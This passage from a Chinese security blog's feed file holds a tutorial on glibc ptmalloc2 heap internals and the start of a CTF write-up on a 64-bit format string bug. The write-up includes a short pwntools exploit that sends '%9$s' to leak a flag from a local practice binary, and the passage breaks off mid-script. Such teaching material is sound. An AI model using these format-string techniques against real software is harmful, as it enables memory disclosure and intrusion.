src="/img/%E7%A8%8B%E5%BA%8F%E4%BF%AE%E6%94%B9%E8%B7%AF%E5%BE%84%E5%90%8E%E5%9B%BE%E6%A0%87%E6%B6%88%E5%A4%B1%E5%8F%8A%E5%8F%B3%E9%94%AE%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/Snipaste_2023-07-24_11-47-13.png"></p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆概述</title>
    <link href="/2023/07/19/%E5%A0%86%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/07/19/%E5%A0%86%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<p>堆的一些基础知识🤪</p><span id="more"></span><h1 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h1><p>堆实际上就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向生长。在程序运行的过程中，堆可以提供动态分配的内存，允许申请大小未知的内存。</p><p>你可以把它看成一个结构体数组，数组里每个元素都会开辟一块内存来存储数据，这块用来存储数据的内存就是堆。结构体数组在BSS段上，其内容就是堆的地址，也就是堆的指针。</p><p>总的来说，和堆有关的部分被划分为了2块，即管理区块和数据存放区块。数据存放区块就是堆，管理区块可以对堆增删改查，也就是堆管理器。</p><p>我们一般称管理堆的那部分程序为堆管理器。堆管理器处于用户程序与内核中间，主要做以下工作：</p><ul><li><p>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。</p><p>为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，由内存管理器来通过过某种算法管理这块内存。只有这块堆空间不足时，堆管理器才会再次与操作系统进行交互。</p></li><li><p>管理用户所释放的内存。</p><p>用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</p></li></ul><blockquote><p>当前 Linux 使用的堆分配器被称为 ptmalloc2，在 glibc 中实现。</p></blockquote><p>需要注意的是，Linux系统中，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 也就是说虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p><h1 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h1><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">heap   <span class="hljs-comment">#查看堆块</span><br>bin    <span class="hljs-comment">#查看bin区块</span><br>p &amp;__free_hook <span class="hljs-comment">#查看某个函数的真实地址</span><br>p *__free_hook <span class="hljs-comment">#查看某个函数的指向</span><br>x/xxgx 0xxxx <span class="hljs-comment">#查看某个地址的内存</span><br>vmmap<br></code></pre></td></tr></table></figure><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p><code>malloc()</code> 是动态内存分配函数。它接收一个参数，即所需分配的内存大小（以字节为单位），并返回指向分配内存起始位置的指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><ul><li>如果 <em>size</em> &#x3D;0，将返回当前系统允许的堆的最小内存块（最小值 min 为0x20）</li><li>如果 <em>size</em> 为负数，由于大部分的系统上 <em>size_t</em> 都是无符号数，所以程序就会分配很大的一块内从空间，但因为系统没有那么多的内存可以分配，通常都会分配失败。</li><li>如果 malloc() 分配失败，返回的指针将为 NULL。</li></ul><blockquote><p>malloc() 分配的内存空间在使用完后需要手动释放，否则可能导致内存泄漏。</p></blockquote><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p><code>free()</code> 是动态内存分配函数。它接受一个参数，即要释放的内存块的起始地址，此函数没有返回值。需要释放的内存空间可能由 <code>malloc()</code>、<code>calloc()</code> 或 <code>realloc() </code> 分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span>;<br></code></pre></td></tr></table></figure><ul><li>当P为空指针，函数并不会执行任何操作</li><li>当 p 已经被释放之后，再次释放会出现 <code>double free </code> 错误 </li><li>除了被禁用 (mallopt) 的情况，如果是释放一块很大的内存空间，程序会将这块内存空间还给系统，以便减小程序所使用的内存空间。</li></ul><h2 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc2 内部用 <code>malloc_chunk</code> 结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。</p><p>无论chunk的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。但是根据是否被释放，不同的chunk的表现形式会有所不同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">struck malloc_chunk&#123;<br>    INTERNAL_SIZE_T prev_size;<br>    INTERNAL_SIZE_T size;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>  <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><strong>prev_size</strong> ：记录前一个较低地址的空闲的 chunk 的大小（包括chunk头）</p><p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用，并将其用于扩展当前内存块的可用空间。这就是 chunk 中的空间复用。</p></li><li><p><strong>size</strong> ：记录的是当前 chunk 的大小，且 <strong>size 的大小必须是 2 * SIZE_SZ 的整数倍</strong>（32 位系统中，<em>SIZE_SZ</em> 是 4；64 位系统中，<em>SIZE_SZ</em> 是 8）。</p><p>如果申请的内存大小不是 <code>2 * SIZE_SZ</code> 的整数倍，会被转换满足大小的最小的 <code>2 * SIZE_SZ</code> 的倍数。</p><p>该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示：</p><ul><li><p><strong>NON_MAIN_ARENA</strong>：记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于</p></li><li><p><strong>IS_MAPPED</strong>：记录当前 chunk 是否是由 mmap 分配的。</p></li><li><p><strong>PREV_INUSE</strong>：记录前一个 chunk 块是否被分配。</p><p>一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 <em>prev_size</em> 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</p></li></ul></li></ul><blockquote><p>物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。</p></blockquote><ul><li><p><strong>fd，bk</strong> ：两个指针变量，用于构建双向链表，只有 chunk 空闲时才会被使用。</p><p>堆管理器会将其添加到适当的空闲内存块链表中统一管理。在链表中，每个空闲内存块都会有指向前一个内存块和后一个内存块的指针。</p><ul><li><strong>fd</strong> ：指向下一个（非物理相邻）空闲的 chunk</li><li><strong>bk</strong> ：指向上一个（非物理相邻）空闲的 chunk</li></ul></li><li><p><strong>fd_nextsize， bk_nextsize</strong> ：两个指针变量，和 fd，bk 作用相同，用于较大的 chunk （large chunk）。</p><p>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。</p><ul><li><p><strong>fd_nextsize</strong> ：指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p></li><li><p><strong>bk_nextsize</strong> ：指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</p></li></ul></li></ul><blockquote><p>如果一个 chunk 处于 free 状态，会有两个位置记录其相应的大小：本身的 size 字段和它后一个 chunk 的 prev_size 字段。</p></blockquote><p>已经被分配的chunk结构如下，我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，也就是 mem 其实指向 user data 的起始处（这才是用户真正申请到的可利用内存）：</p><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/usechunk.png"></p><p>被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下：<br><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/freechunk.png"></p><h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>用户释放掉的 chunk 不会马上归还给系统，而是由堆管理器统一管理 heap 和 mmap 映射区域中的空闲的 chunk。空闲的 chunk 我们称之为 bin 。</p><p>在实际的实现中，堆管理器采用分箱式方法对空闲的 chunk 进行管理。根据大小将 bin 分为4类：fast bin , small bin , large bin , unsorted bin。在此基础上，每一类 bin 当中内存大小相似的会由双向链表链接，也就是说每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk 。</p><p>对于 small bins，large bins，unsorted bins 来说，ptmalloc 将它们维护在同一个数组中。这些 bin 对应的数据结构在 malloc_state 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS 128</span><br>mchunkptr bins[ NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span> ];<br></code></pre></td></tr></table></figure><p><code>bins</code> 主要用于索引不同 bin 的 fd 和 bk。以 32 位系统为例，bins 前 4 项的含义如下：</p><table><thead><tr><th>下标</th><th>0</th><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr><td>含义</td><td>bin1 的 fd&#x2F;bin2 的 prev_size</td><td>bin1 的 bk&#x2F;bin2 的 size</td><td>bin2 的 fd&#x2F;bin3 的 prev_size</td><td>bin2 的 bk&#x2F;bin3 的 size</td></tr></tbody></table><p>可以看到，bin2 的 prev_size、size 和 bin1 的 fd、bk 是重合的。由于我们只会使用 fd 和 bk 来索引链表，所以该重合部分的数据其实记录的是 bin1 的 fd、bk。虽然后一个 bin 和前一个 bin 共用部分数据，但是其实记录的仍然是前一个 bin 的链表数据。通过这样的复用，可以节省空间。</p><p>数组中的 bin 依次如下：</p><ul><li>第一个是 <strong>unsorted bins</strong>，这里面的bin都没有进行排序，相对杂乱</li><li>索引从 2 到 63 的 bin 称为 <strong>small bin</strong>s。同一个链表中的 chunk 大小相等，两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 2 个机器字长，即 32 位相差 8 字节，64 位相差 16 字节。</li><li>small bins 后面的 bin 被称作 <strong>large bins</strong>。large bin 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li></ul><h5 id="Fast-bins"><a href="#Fast-bins" class="headerlink" title="Fast bins"></a>Fast bins</h5><p>有很多的程序都会申请以及释放一些小内存块，如果小内存块释放以后存在与之相邻的空闲的 chunk ，我们将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要再次对 chunk 进行分割，这样就大大降低了堆的利用效率。</p><p>为了解决这个问题，ptmalloc 中专门设计了 <code>fast bin</code>，顾名思义它用来快速分配内存。</p><p>当用户需要的 chunk 的大小小于 fastbin 的最大值时， 堆管理器会首先判断 fastbin 中相应的 bin 中是否有对应大小的空闲块，如果有的话，就会直接从这个 bin 中获取 chunk。如果没有的话，堆管理器才会进行接下来的一系列操作。</p><blockquote><p>在32位系统中，系统默认的 fast bin 大小为 64 字节，但实际上它可以处理最大 80 字节的数据空间。除此之外，fast bin 可以支持的 bin 的个数为10个，从数据空间为 8 字节开始一直到 80 字节。</p></blockquote><p>fast bins 的特点：</p><ul><li><p>采用<strong>单向链表</strong>对其中的每个 bin 进行组织</p></li><li><p>每个 bin 采取 LIFO 策略，也就是<strong>后进先出</strong>的方式，最近释放的 chunk 会更早地被分配。</p></li></ul><h5 id="Small-bins"><a href="#Small-bins" class="headerlink" title="Small bins"></a>Small bins</h5><p>small bins 就是 small chunk，当中每个 chunk 的大小与其所在的 bin 的 index 的关系为：<code>chunk_size = 2 * SIZE_SZ *index</code>，具体如下：</p><table><thead><tr><th>下标</th><th>2</th><th>3</th><th>4</th><th>5</th><th>x</th><th>63</th></tr></thead><tbody><tr><td>SIZE_SZ&#x3D;4（32 位）</td><td>16</td><td>24</td><td>32</td><td>40</td><td>2*4*x</td><td>504</td></tr><tr><td>SIZE_SZ&#x3D;8（64 位）</td><td>32</td><td>48</td><td>64</td><td>80</td><td>2*8*x</td><td>1008</td></tr></tbody></table><p>small bins 的特点：</p><ul><li>采用<strong>双向链表</strong>对 bin 进行管理。每个链表都有链表头结点，且每个链表中存储的 chunk 大小都一致。</li><li>每个 bin 对应的链表采用 FIFO 的规则，也就是<strong>先进先出</strong>，所以同一个链表中先被释放的 chunk 会先被分配出去。</li></ul><h5 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h5><p>large bins 是用于管理较大内存块的数据结构。</p><p>和small bins相同，large bins采用<strong>双向链表</strong>进行管理，同时采用采用 FIFO 的规则。</p><h5 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h5><p>unsorted bin 是用于管理未分类的空闲内存块的数据结构。当一个内存块被释放时，堆内存管理器会将其添加到 unsorted bin 中，而不是直接合并到其他特定大小范围的 bin 中。</p><p>unsorted 的字面意思就是” 不可回收” 的意思，可以看作将不可回收的垃圾（不满足能够进行内存分配的堆块）都放到这个” 垃圾桶” 中。</p><h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。</p><p>其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 chunk 。这个 chunk 不属于任何一个 bin，它的作用在于当所有的 bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对 heap 进行扩展后再进行分配。</p><p>需要注意的是，top chunk 的 <em>prev_inuse</em> 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p><h3 id="Last-remainder"><a href="#Last-remainder" class="headerlink" title="Last remainder"></a>Last remainder</h3><p>在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 last remainder chunk ，由 unsorted bin 进行存储。</p><p>需要注意的是 top chunk 分割剩下的部分不会作为 last remainder。</p><h2 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>arena 是指一块用于管理和分配内存的区域，是内存池的一种。它是堆内存管理的一种组织方式，每个 arena 都是一个独立的内存区域，用于管理特定范围内的内存块。默认情况下，glibc 为每个线程分配一个 arena，以减少不同线程之间的竞争和锁冲突。</p><blockquote><p>main_arena 并不在申请的 heap 中，而是一个全局变量，在 libc.so 的数据段。</p></blockquote><p>需要注意的是，并不是每一个线程都有对应的 arena（使用了系统级的内存分配方式如 mmap() 等，线程可能会绕过 glibc 的内存分配机制，因此没有与 glibc 相关联的 arena；除此之外也可以手动设置限制线程的 arena 创建数量）。</p><h5 id="分配规则"><a href="#分配规则" class="headerlink" title="分配规则"></a>分配规则</h5><ul><li><p><code>arena</code>: 有一个 main_arena ，是由主线程创建的，thread_arena 则为各线程创建的，当 arena 满了之后就不再创建而是与其他 arena 共享一个 arena，方法为依次给各个 arena 上锁（查看是否有其他线程正在使用该arena），如果上锁成功（没有其他线程正在使用），则使用该 arena ，之后一直使用这个 arena ，如果无法使用则阻塞等待。</p></li><li><p><code>heap</code>：等级比arena要低一些，一个 arena 可以有多个 heap，也是存储了堆相关的信息。</p></li><li><p><code>chunk</code>：分配给用户的内存的一个单位，每当我们分配一段内存的时候其实就是分配得到了一个 chunk ，我们就可以在 chunk 当中进行一定的操作了。不过为了进行动态分配，chunk 本身也有一些数据（元数据），是用来指示其分配等等的数据。</p></li></ul><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>当程序刚刚开始运行时，每一个线程是没有自己的 heap 区域的，需要程序主动申请内存。当程序使用完了这个  heap 的资源，就必须要再次申请，并且一般情况下申请的 heap 是不连续的。我们就需要 heap_info这个数据结构来记录不同 heap 之间的链接关系。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr;                 <span class="hljs-comment">//对应的arena的地址               </span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span>       <span class="hljs-comment">//上一个 heap_info 的地址   </span><br>  <span class="hljs-type">size_t</span> size;                   <span class="hljs-comment">//当前堆的大小        </span><br>  <span class="hljs-type">size_t</span> mprotect_size;          <span class="hljs-comment">//堆实际使用的内存大小</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; <span class="hljs-comment">//填充字段，用于对齐 _heap_info 结构体的大小</span><br>&#125; heap_info;<br></code></pre></td></tr></table></figure><p>特点：</p><ul><li>使用单向链表进行链接</li><li>需要确保 <code>MALLOC_ALIGN_MASK+1</code> 对齐，所以可能会用到 <em>pad</em>，</li></ul><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>malloc_state 结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲 chunk，有什么大小的空闲 chunk 等等。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。</p><blockquote><p>由于 thread 的 arena 可能有多个，所以它的 malloc state 结构会在最新申请的 arena 中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br>    __libc_lock_define(, mutex);            <span class="hljs-comment">//用于控制程序串行访问同一个分配区,实现访问的互斥锁。</span><br>    <span class="hljs-type">int</span> flags;                              <span class="hljs-comment">//标志位，用于记录一些状态信息</span><br>    mfastbinptr fastbinsY[ NFASTBINS ];     <span class="hljs-comment">//fastbin 的空闲块链表,存放每个 fast chunk 链表头部的指针</span><br>    mchunkptr top;<span class="hljs-comment">//最顶部的内存块，用于指示当前可用的内存位置</span><br>    mchunkptr last_remainder;               <span class="hljs-comment">//最近一次分割的小块内存请求剩余部分的内存块</span><br>    mchunkptr bins[ NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span> ];        <span class="hljs-comment">//用于存储 unstored bin，small bins 和 large bins 的 chunk 链表</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[ BINMAPSIZE ];      <span class="hljs-comment">//标识某一个 bin 中是否包含空闲 chunk</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span>              <span class="hljs-comment">//指向下一个 arena 的指针，形成了一个链表结构</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span>         <span class="hljs-comment">//指向下一个空闲的 arena 的指针，形成了一个链表结构。</span><br>    INTERNAL_SIZE_T attached_threads;       <span class="hljs-comment">//附加到此 arena 的线程数量</span><br>    INTERNAL_SIZE_T system_mem;             <span class="hljs-comment">//在该 arena 中从系统分配的内存总量</span><br>    INTERNAL_SIZE_T max_system_mem;         <span class="hljs-comment">//在该 arena 中从系统分配的内存的最大值</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>要注意的是，main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so 的数据段。</strong></p><h2 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h2><p>我们在程序代码中使用 malloc 函数和 free 函数来申请和分配内存。但实际上与系统交互的并不是这两个函数而是</p><p><code>(s)brk</code> 函数以及 <code>mmap</code> 函数，它们之间的关系如下：</p><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/malloc_sys.png"></p><p>具体的结构如下图（和网上的那些图一样，我重做一张图是因为网上的都是英文，我的英语水平不高看不懂😅）：</p><blockquote><p>要注意的是，并不是所有的 ”堆“ 都在 Heap 区域，mmap 对应 <code>Memory Mapping Segment</code> ，brk 才是对应 <code>Heap</code> 的。</p><p>下图为32位程序的虚拟内存结构，64位的虚拟地址大小为8GB，但结构大致相同。</p></blockquote><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/stack_heap.png"></p><p>如上图，我们的 malloc 函数是在用户空间对应的 0~3G 的内存进行操作，但用户空间的代码不能直接访问内核空间，因此需要借用 sbrk() 等系统函数充当与内核之间的接口。当然我们也可以直接在用户空间的代码中使用系统调用，进而越过接口直接与系统内核交互，也能达到同样的效果（但是系统调用的效率会相对较低）。</p><p><code>brk</code> 适用于小块内存的分配和释放，而 <code>mmap</code> 适用于大块内存的分配和一些特殊需求（例如映射文件到内存），接下来会进行详细的分析。</p><p>我们主要来分析申请堆块的操作</p><h4 id="brk-与-sbrk"><a href="#brk-与-sbrk" class="headerlink" title="brk 与 sbrk"></a>brk 与 sbrk</h4><p>这两个函数都是通过改变 peogram break （程序中断点）的位置来改变数据段长度，进而实现虚拟内存到物理内存的映射。</p><h5 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h5><p> <code>brk</code> 通过修改数据段的末尾地址实现内存的分配与回收。它的原型为  <code>void *brk(void *addr);</code> ，其中参数 <em>addr</em> 是新的 Heap 段结束地址。调用 <code>brk</code> 后，操作系统将 Heap 段的结束地址设置为 <em>addr</em>，并将 Heap 段扩展或缩小至新的结束地址。</p><p>初始时，堆段的起始地址 <em>start_brk</em> 以及结束位置 <em>brk</em> 指向同一位置，根据程序是否开启了 ASLR保护，位置会有所不同 ：</p><ul><li>不开 ASLR 保护时， <em>start_brk</em> 以及 <em>brk</em> 会指向 data&#x2F;bss 段的结尾；</li><li>开启 ASLR 保护时，<em>start_brk</em> 以及 <em>brk</em> 会指向 data&#x2F;bss 段后的随机偏移处（两个指针仍指向同一处）</li></ul><h5 id="sbrk"><a href="#sbrk" class="headerlink" title="sbrk"></a>sbrk</h5><p><code>sbrk  </code> 通过控制间断点向前或向后移动指定长度字节来实现内存的分配与回收。它的原型为 <code>void *sbrk(intptr_t increment);</code>，其中参数 <em>increment</em> 是需要增加或减小的字节数，根据 <em>increment</em> 数值的不同，对应的变化也不相同：</p><ul><li>当 <em>increment</em> 为正数时，peogram break 会向高地址移动相应的字节数，同样堆的大小会增加相应的字节数，相当于申请内存；</li><li>当 <em>increment</em> 为负数时，peogram break 会向低地址移动相应的字节数，同样堆的大小会减小相应的字节数，相当于释放内存；</li><li>当 <em>increment</em> 为 0 时，peogram break 不移动位置，同样函数只返回当前位置。</li></ul><h4 id="mmap-与-munmap"><a href="#mmap-与-munmap" class="headerlink" title="mmap 与 munmap"></a>mmap 与 munmap</h4><p><code>mmap</code> 函数是一种内存映射文件的方法，将文件或者其他对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中的某一段虚拟地址的一一对应关系。</p><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/mmap.png"></p><p>映射关系一旦建立，就可以直接再内存中对映射的文件进行读写，对应的操作会直接反映在映射的文件上，不用再借用系统调用函数了。</p><p><code>mmap</code> 的函数原型是 <code>void * mmap(void * addr, size_t length,int prot,int flags,int fd,off_t offset);</code> ，其中 <em>length</em> 是指定的映射长度，它并没有严格要求必须填入操作系统分页大小的整数倍，但是操作系统会自动向上取整，确保映射的长度满足对其要求。</p><p><code>munmap</code> 函数用于解除映射关系，其函数原型为 <code>int munmap(void * addr, size_t length);</code> ，<em>addr</em> 为函数返回接收的地址，<em>length</em> 为请求分配的长度。</p><hr><p>未完待续🤗</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串进阶版</title>
    <link href="/2023/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/"/>
    <url>/2023/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/</url>
    
    <content type="html"><![CDATA[<p>习题和一些解题技巧</p><span id="more"></span><h1 id="64-位程序格式化字符串漏洞"><a href="#64-位程序格式化字符串漏洞" class="headerlink" title="64 位程序格式化字符串漏洞"></a>64 位程序格式化字符串漏洞</h1><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>之前学习基础的时候我们都把程序编译成32位，64位的漏洞原理也是相似的，只不过还是传参方式上的细微差别。虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</p><h4 id="🌰："><a href="#🌰：" class="headerlink" title="🌰："></a>🌰：</h4><p>题目在这里：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a> </p><blockquote><p>这道题目的原题里有获取本地flag.txt文件的代码部分，我们要本地复现的话需要自己新建一个flag.txt文件</p></blockquote><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodluck_run.png"></p><p>看看源代码，主要逻辑就是先获取flag内容放在v10里，获取用户输入进行对比，如果用户输入的flag正确，则输出flag，也就是说我们要让 <code>v10[j]=v4</code> 。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodluck_main.png"></p><p>我们可以看出这是一个格式化字符串漏洞。根据格式化字符串解题的步骤，我们首先确定格式化字符串变量的偏移位置。</p><p>在printf处下断点，注意我们要输出的是题目的flag，所以获取的是题目flag的偏移。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/gdb_padding.png"></p><p>我们可以看出相对应的 flag 是栈上的第四个变量，除此之外，64位的程序前六个变量储存在寄存器中，而 fmt 字符串又在 rdi 上，所以 flag 相对于 fmt 字符串的偏移就是（剩余的五个寄存器+4）&#x3D;9。</p><p>或者也可以利用工具比如 pwndbg ，有一条 <code>fmtarg [目标地址]</code> 的指令可以直接输出偏移。注意要把断点断在printf。</p><p><img src="/img/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/goodkuck_pwndbg.png"></p><p>最终的exp为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./goodluck&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;%9$s&#x27;</span><br>p.sendline(payload)<br><span class="hljs-built_in">print</span> 